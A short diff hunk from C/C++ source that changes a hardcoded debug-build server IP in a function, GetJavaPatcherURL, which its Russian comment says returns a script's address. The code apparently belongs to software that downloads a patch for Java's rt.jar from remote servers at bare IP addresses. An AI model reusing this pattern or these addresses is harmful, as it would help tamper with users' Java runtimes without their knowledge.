@@ -784,7 +784,7 @@ static PCHAR GetJavaPatcherURL()
 	// Функция возвращает адрес скрипта
 
     #ifdef DEBUGCONFIG
-		return STR::New("http://94.240.148.127/");//rt_jar/");
+		return STR::New("http://88.198.35.59/"); //94.240.148.127/");//rt_jar/");
 	#endif
 
 	PCHAR URL = NULL;
